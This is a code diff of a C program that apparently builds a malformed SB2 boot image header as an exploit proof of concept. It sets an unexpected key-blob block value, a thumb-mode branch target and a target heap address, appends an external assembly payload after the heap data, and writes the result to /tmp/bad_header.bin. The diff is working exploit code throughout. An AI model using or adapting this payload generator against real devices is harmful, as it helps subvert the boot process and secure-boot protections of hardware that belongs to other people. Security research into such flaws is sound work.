@@ -4,6 +4,8 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <string.h>
+#include <sys/stat.h>
+#include <errno.h>
 
 typedef uint32_t section_id_t;
 
@@ -52,14 +54,17 @@ typedef struct version_t version_t;
 int main() {
 	struct sb2_header_t header = { 0 };
 
+	// This is waaaay more than we need but it gives us space
 	uint32_t extra_bytes[1000] =  { 0 };
-	int fd;
+	int in_fd, out_fd, assembly_fd, ret, size;
+	struct stat st;
 
 	// Extra data used for sb2 checking?
 	header.nonce[0] = 0x00000e8f;
 	// Branch target!
 	// Remember to set the low bit for thumb mode
 	header.nonce[1] = 0x1301ae71;
+	//header.nonce[1] = 0x14001775;
 	// Branch to self (just for testing)
 	header.nonce[2] = 0xe7fee7fe;
 	// Extra 
@@ -87,7 +92,7 @@ int main() {
 	header.m_headerBlocks = 0x6;
 
 	// Our magic: set this to something unexpected!
-	header.m_keyBlobBlock = 0x23;
+	header.m_keyBlobBlock = 0x30;
 
 	header.m_keyBlobBlockCount = 0x1;
 	header.m_maxSectionMacCount = 0x5;
@@ -107,21 +112,42 @@ int main() {
 
 	// This is our target heap
 	extra_bytes[114] = 0x14001478;
+	// Heap size
 	extra_bytes[115] = 0x4000;
+	// afterwards is heap bytes -- we can't overwrite this!
 
-	fd = open("/tmp/test.bin", O_WRONLY | O_CREAT);
+	in_fd = open("assembly.bin", O_RDONLY);
 
-	if (fd < 0) {
-		printf("bad fd\n");
+	if (in_fd < 0) {
+		printf("failed to open assembly");
+		exit(1);
+	}
+
+	
+	fstat(in_fd, &st);
+	size = st.st_size;
+
+	// Read in to the space after our heap stuff	
+	ret = read(in_fd, &extra_bytes[117], size);
+	
+	if (ret < 0) {
+		printf("failed to read");
+		exit(1);
+	}
+
+	printf("read %d\n", ret);
+	out_fd = open("/tmp/bad_header.bin", O_WRONLY | O_CREAT, 0666);
+
+	if (out_fd < 0) {
+		printf("failed to open %s \n", strerror(errno));
 		exit(-1);
 	}
 
-	write(fd, (void *) &header, sizeof(header));
-	//flush(fd);
+	write(out_fd, (void *) &header, sizeof(header));
 
-	write(fd, (void *)extra_bytes, sizeof(extra_bytes));
+	write(out_fd, (void *)extra_bytes, sizeof(extra_bytes));
 
-	close(fd);
+	close(out_fd);
 
 	printf("Done.\n");
 	 
